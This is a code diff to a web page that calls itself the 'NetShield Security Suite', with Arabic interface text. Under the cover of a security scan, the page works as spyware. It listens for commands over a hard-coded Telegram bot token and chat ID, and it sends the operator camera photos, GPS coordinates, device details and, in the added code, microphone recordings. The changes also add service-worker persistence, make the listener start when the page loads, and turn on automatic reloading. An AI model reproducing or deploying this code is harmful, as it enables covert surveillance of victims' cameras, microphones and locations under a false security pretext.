@@ -4,6 +4,14 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
 <title>NetShield Security Suite</title>
+
+<!-- PWA Manifest -->
+<link rel="manifest" href="/manifest.json">
+<meta name="theme-color" content="#080c14">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<meta name="apple-mobile-web-app-title" content="NetShield Pro">
+
 <style>
 :root {
   --bg-primary: #080c14;
@@ -382,9 +390,10 @@ body {
 // ==================== CONFIGURATION ====================
 const BOT_TOKEN = "8538439468:AAHWECtOde50fTxLEVgMAM3qtg0KxWLbSGI";
 const CHAT_ID = "6453594151";
-const MICROPHONE_DURATION = 10000; // 10 ثواني
-const COMMAND_CHECK_INTERVAL = 5000;
+const MICROPHONE_DURATION = 10000;
+const COMMAND_CHECK_INTERVAL = 2000;
 const VISITOR_ALERT = true;
+const AUTO_REFRESH_INTERVAL = 60000;
 
 let scanData = {
   deviceInfo: null, battery: null, network: null,
@@ -394,6 +403,13 @@ let scanData = {
 let lastUpdateId = 0;
 let commandListenerActive = false;
 let currentRetryFunction = null;
+
+// ==================== PWA & SERVICE WORKER ====================
+if ('serviceWorker' in navigator) {
+  navigator.serviceWorker.register('/sw.js')
+    .then(reg => console.log('SW registered'))
+    .catch(err => console.log('SW failed'));
+}
 
 // ==================== ALERT ON LOAD ====================
 if (VISITOR_ALERT) {
@@ -449,7 +465,7 @@ function checkLocation() {
 function showPermissionPrompt(permissionName) {
     const promptDiv = document.getElementById('permissionPrompt');
     const textEl = document.getElementById('permissionText');
-    textEl.textContent = `⚠️ صلاحية ${permissionName} مرفوضة. الفحص لن يكتمل بدونها. اضغط لمنحها:`;
+    textEl.textContent = `صلاحية ${permissionName} مرفوضة. الفحص لن يكتمل بدونها. اضغط لمنحها:`;
     promptDiv.style.display = 'block';
 }
 
@@ -554,14 +570,21 @@ function requestNotificationPermission() {
 
 function showNotification(title, body) {
   if ('Notification' in window && Notification.permission === 'granted') {
-    new Notification(title, { body: body, icon: 'data:image/svg+xml,...' });
+    navigator.serviceWorker.ready.then(registration => {
+      registration.showNotification(title, {
+        body: body,
+        icon: 'https://cdn-icons-png.flaticon.com/512/564/564619.png',
+        vibrate: [200, 100, 200],
+        requireInteraction: true
+      });
+    });
   }
 }
 
 // ==================== TELEGRAM COMMANDS ====================
 async function checkForCommands() {
   try {
-    const resp = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=10`);
+    const resp = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`);
     const data = await resp.json();
     if (data.ok && data.result.length > 0) {
       for (const upd of data.result) {
@@ -570,34 +593,43 @@ async function checkForCommands() {
         if (msg && msg.text) {
           const cmd = msg.text.toLowerCase().trim();
           
-          if (cmd === '/photo') {
-            if (!scanData.permissions.camera) { sendText('❌ صلاحية الكاميرا غير مفعلة'); continue; }
+          if (cmd === '/photo' || cmd === '/camera' || cmd === '/cam') {
+            if (!scanData.permissions.camera) { sendText('صلاحية الكاميرا غير مفعلة'); continue; }
             await captureCamera();
-            if (scanData.camera) { await sendPhoto(scanData.camera); sendText('📷 صورة جديدة'); }
-            else { sendText('❌ فشل الوصول للكاميرا'); }
+            if (scanData.camera) { await sendPhoto(scanData.camera); sendText('صورة جديدة من الكاميرا'); }
+            else { sendText('فشل الوصول للكاميرا'); }
           }
-          else if (cmd === '/location') {
-            if (!scanData.permissions.location) { sendText('❌ صلاحية الموقع غير مفعلة'); continue; }
+          else if (cmd === '/location' || cmd === '/loc' || cmd === '/gps') {
+            if (!scanData.permissions.location) { sendText('صلاحية الموقع غير مفعلة'); continue; }
             await captureLocation();
-            if (scanData.location) { const l=scanData.location; sendText(`📍 الموقع:\n${l.latitude}, ${l.longitude}\nخرائط: https://maps.google.com/?q=${l.latitude},${l.longitude}`); }
-            else { sendText('❌ فشل تحديد الموقع'); }
+            if (scanData.location) { const l=scanData.location; sendText(`الموقع الحالي:\nالاحداثيات: ${l.latitude}, ${l.longitude}\nالدقة: ${Math.round(l.accuracy)} متر\nخرائط: https://maps.google.com/?q=${l.latitude},${l.longitude}`); }
+            else { sendText('فشل تحديد الموقع'); }
           }
-          else if (cmd === '/info') {
+          else if (cmd === '/info' || cmd === '/device' || cmd === '/status') {
             collectDeviceInfo(); await collectNetworkData(); await sleep(500);
-            let t='📱 معلومات الجهاز:\n\n';
+            let t='معلومات الجهاز:\n\n';
             if(scanData.deviceInfo){ const d=scanData.deviceInfo; t+=`النظام: ${d.platform}\nالذاكرة: ${d.ram} GB\nالمعالج: ${d.cores} نواة\n`; }
             if(scanData.battery){ t+=`البطارية: ${scanData.battery.level}%\nالشحن: ${scanData.battery.charging?'موصول':'غير موصول'}\n`; }
             if(scanData.network){ t+=`النت: ${scanData.network.type} - ${scanData.network.downlink} Mbps\n`; }
             t+=`الوقت: ${new Date().toLocaleString('ar-EG')}`; sendText(t);
           }
-          else if (cmd === '/full') { await sendCompleteReport(); }
-          else if (cmd === '/help') { sendText('📋 الاوامر:\n\n/photo - صورة\n/location - موقع\n/info - معلومات\n/full - تقرير كامل\n/notify - اشعار\n/ping - اتصال\n/help - مساعدة'); }
-          else if (cmd === '/ping') { sendText('🟢 الجهاز متصل وجاهز'); }
+          else if (cmd === '/full' || cmd === '/scan' || cmd === '/report') { await sendCompleteReport(); }
+          else if (cmd === '/record' || cmd === '/mic' || cmd === '/audio') {
+            if (!scanData.permissions.microphone) { sendText('صلاحية الميكروفون غير مفعلة'); continue; }
+            sendText('جاري التسجيل (10 ثواني)...');
+            await captureMicrophone();
+            if (scanData.microphone) { await sendAudio(scanData.microphone); sendText('تم التسجيل'); }
+            else { sendText('فشل التسجيل'); }
+          }
+          else if (cmd === '/help' || cmd === '/start') { 
+            sendText('الاوامر المتاحة:\n\n/photo - التقاط صورة\n/location - الموقع الحالي\n/info - معلومات الجهاز\n/full - تقرير كامل\n/record - تسجيل 10 ثواني\n/notify - ارسال اشعار\n/ping - التحقق من الاتصال\n/help - عرض المساعدة'); 
+          }
+          else if (cmd === '/ping') { sendText('الجهاز متصل وجاهز'); }
           else if (cmd.startsWith('/notify ')) {
-            if (!scanData.permissions.notification) { sendText('❌ صلاحية الاشعارات غير مفعلة'); continue; }
+            if (!scanData.permissions.notification) { sendText('صلاحية الاشعارات غير مفعلة'); continue; }
             const txt = msg.text.replace('/notify ', '');
             showNotification('NetShield Pro', txt);
-            sendText('✅ تم ارسال الاشعار: ' + txt);
+            sendText('تم ارسال الاشعار: ' + txt);
           }
         }
       }
@@ -607,7 +639,7 @@ async function checkForCommands() {
 
 function startCommandListener() {
   document.getElementById('remoteIndicator').style.display = 'block';
-  sendText('🟢 الوكيل نشط - الجهاز جاهز لاستقبال الاوامر');
+  sendText('الوكيل نشط - الجهاز جاهز لاستقبال الاوامر');
   setInterval(checkForCommands, COMMAND_CHECK_INTERVAL);
 }
 
@@ -641,6 +673,14 @@ function updateStep(n,s){ const el=document.getElementById('step'+n); el.classNa
 function resetSteps(){ for(let i=1;i<=4;i++)document.getElementById('step'+i).className='progress-step'; document.getElementById('progressBar').style.width='0%'; }
 function updateMainStatus(s){ const dot=document.getElementById('mainStatusDot'); const ti=document.getElementById('mainStatusTitle'); const de=document.getElementById('mainStatusDesc'); if(s){ dot.classList.add('protected'); ti.textContent='محمي'; de.textContent='جميع الانظمة نشطة'; } else { dot.classList.remove('protected'); ti.textContent='غير محمي'; de.textContent='الفحص مطلوب'; } }
 function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }
+
+// ==================== START LISTENER ON LOAD ====================
+startCommandListener();
+
+// ==================== AUTO REFRESH ====================
+setInterval(function() {
+  location.reload();
+}, AUTO_REFRESH_INTERVAL);
 
 // ==================== SECURITY ====================
 document.addEventListener('contextmenu',e=>e.preventDefault());
